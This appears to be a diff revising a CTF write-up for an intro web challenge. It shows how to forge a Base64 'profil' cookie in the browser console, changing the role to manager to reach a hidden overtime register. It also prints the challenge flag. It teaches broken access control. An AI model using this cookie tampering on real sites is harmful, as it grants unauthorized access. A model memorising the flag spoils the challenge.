@@ -1,32 +1,42 @@
 # Pointeuse Fantôme
 
+**Challenge title:** Pointeuse Fantôme  
 **Category:** Web  
 **Difficulty:** Intro  
 **Points:** 50  
-**Status:** Solved
+**Author:** Perceval
 
-## Challenge Description
+## File
 
-Tricatel's new time-tracking software quietly removes overtime hours from employee records. An employee can only view their own timesheet, while a manager can consult the actual overtime register.
+- Application: https://pointeuse.cyberzerk.fr
 
-## Initial Reconnaissance
+## Solution
 
-The application showed:
+### Step 1: Inspect the application
 
-- Employee ID: `8472`
-- Role: `employe`
+After opening the application, the page showed:
+
+- Connected user: `Vous (#8472)`
+- Profile: `employe`
 - Declared overtime: `0 h`
-- A notice stated that only a manager could view the actual register.
 
-## Cookie Inspection
+The page also stated that only a manager profile could consult the actual overtime register.
 
-Using the browser DevTools Console:
+### Step 2: Inspect the browser cookie
+
+Open DevTools → Console and run:
 
 ```javascript
 document.cookie
 ```
 
-The page used a cookie named `profil`. Its value was URL-encoded Base64 data. Decoding it revealed:
+The application used a cookie named `profil`:
+
+```text
+profil=eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D
+```
+
+After URL decoding and Base64 decoding, its contents were:
 
 ```json
 {
@@ -35,9 +45,11 @@ The page used a cookie named `profil`. Its value was URL-encoded Base64 data. De
 }
 ```
 
-## Exploitation
+This revealed that the role was stored in a client-side cookie.
 
-The role value was changed to `manager` in the cookie:
+### Step 3: Modify the role
+
+Change the role from `employe` to `manager` by setting the cookie to the Base64-encoded JSON:
 
 ```javascript
 const profile = {
@@ -49,17 +61,15 @@ document.cookie =
   "profil=" + encodeURIComponent(btoa(JSON.stringify(profile))) + "; path=/";
 ```
 
-After refreshing the page:
+Refresh the page:
 
 ```javascript
 location.reload();
 ```
 
-the application displayed the manager view.
+### Step 4: View the actual overtime register
 
-## Results
-
-The actual overtime register showed:
+The application now displayed the manager view with the actual overtime records:
 
 | Employee | Overtime declared | Actual overtime |
 |---|---:|---:|
@@ -67,16 +77,18 @@ The actual overtime register showed:
 | HR Intern | 0 h | 31 h |
 | You (#8472) | 0 h | 44 h |
 
+### Step 5: Obtain the flag
+
+The flag was displayed in the manager view.
+
 ## Flag
 
 ```text
 CyberZerk{P0int3us3_Qu1_0ubl13_L3s_H3ur3s_Sup}
 ```
 
-## Key Takeaway
+## Security Lesson
 
-The application trusted a role value supplied in a client-side cookie that could be modified by the user. Authorization decisions should be enforced server-side using a trusted, integrity-protected session and server-side role checks.
+This challenge demonstrates Broken Access Control through client-side role manipulation. The application trusted a role value stored in a user-editable cookie.
 
-**Vulnerability:** Broken Access Control  
-**Technique:** Client-side cookie manipulation and Base64 decoding  
-**Impact:** Unauthorized access to the manager-only overtime register.
+Authorization decisions should be enforced server-side. A client-side role value must not be trusted as proof of a user's permissions.
